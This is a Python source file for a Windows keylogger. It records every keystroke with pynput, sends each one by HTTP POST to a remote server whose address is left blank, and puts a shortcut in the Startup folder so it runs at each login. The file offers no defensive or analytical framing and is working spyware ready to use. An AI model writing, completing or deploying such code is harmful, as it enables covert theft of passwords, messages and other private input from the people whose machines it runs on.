import os
import pathlib
import winshell
import win32com.client
from datetime import datetime
import pynput
import requests


def init():
    new_kl = KeyListener()
    new_kl.first_run()
    new_kl.run()


class KeyListener:

    def __init__(self):
        self.serverName = ""
        self.serverPort = ""
        self.program_name = ""

    def on_press(self, key):
        current_time_formatted = datetime.now().strftime("%Y-%m-%d : %H:%M:%S")
        prepared_key = "[%s]: %s pressed" % (current_time_formatted, key)

        prepared_obj = {"Body": prepared_key}
        requests.post("%s:%s" % (self.serverName, self.serverPort), data=prepared_obj)

    def first_run(self):

        shortcut_name = self.program_name + ".lnk"

        file_list = os.listdir(winshell.startup())

        if shortcut_name in file_list:
            return False
        else:
            # Get current dir, and append it to target file path
            current_dir_path = pathlib.Path(pathlib.Path().resolve())
            target_file_path = os.path.join(current_dir_path, "%s.exe" % self.program_name)

            # Get startup file path, and add .lnk file to it
            startup = pathlib.Path(winshell.startup())
            path = os.path.join(startup, '%s.lnk' % self.program_name)

            # Get shell to create a shortcut to the desired path
            shell = win32com.client.Dispatch("WScript.Shell")
            shortcut = shell.CreateShortCut(path)

            # Add path and icon to the location
            shortcut.Targetpath = target_file_path
            shortcut.IconLocation = target_file_path
            shortcut.save()

    def run(self):
        with pynput.keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()


if __name__ == '__main__':
    init()
